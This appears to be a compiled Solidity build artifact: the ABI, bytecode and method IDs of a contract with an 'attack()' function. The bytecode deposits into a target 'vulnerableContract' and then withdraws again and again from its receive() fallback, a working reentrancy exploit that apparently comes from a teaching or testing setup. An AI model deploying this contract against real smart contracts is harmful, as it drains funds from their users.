{"abi":[{"type":"constructor","inputs":[{"name":"_vulnerableContract","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"vulnerableContract","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IVulnerableContract"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161024e38038061024e833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6101c8806100865f395ff3fe60806040526004361061002b575f3560e01c8063144166ae146100a15780639e5faafc146100db575f5ffd5b3661009d575f546001600160a01b03163134811061009b575f5460405163b4a7819f60e01b81523460048201526001600160a01b039091169063b4a7819f906024015f604051808303815f87803b158015610084575f5ffd5b505af1158015610096573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b3480156100ac575f5ffd5b505f546100bf906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b61009b5f805460408051630d0e30db60e41b815290516001600160a01b039092169263d0e30db0923492600480820193929182900301818588803b158015610121575f5ffd5b505af1158015610133573d5f5f3e3d5ffd5b50505f5460405163b4a7819f60e01b81523460048201526001600160a01b03909116935063b4a7819f925060240190505f604051808303815f87803b15801561017a575f5ffd5b505af115801561018c573d5f5f3e3d5ffd5b5050505056fea2646970667358221220ec1e3aed33da054c32cb2abde7905cabfde2b1f006ab616b7fda13965f9ea6e464736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","vulnerableContract()":"144166ae"},"id":23}